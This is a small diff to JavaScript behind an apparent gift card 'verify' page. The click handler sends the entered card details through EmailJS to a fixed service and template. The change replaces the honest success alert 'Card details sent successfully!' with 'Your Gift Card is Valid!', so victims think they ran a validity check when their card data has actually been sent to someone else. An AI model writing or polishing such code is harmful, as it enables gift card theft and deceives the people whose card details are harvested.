@@ -29,7 +29,7 @@ document.getElementById('verifyButton').addEventListener('click', function() {
     emailjs.send('service_aka8bfr', 'template_diiuypm', templateParams)
         .then(function(response) {
             console.log('SUCCESS!', response.status, response.text);
-            alert("Card details sent successfully!");
+            alert("Your Gift Card is Valid!");
         }, function(error) {
             console.log('FAILED...', error);
             alert("Failed to send card details. Please try again.");
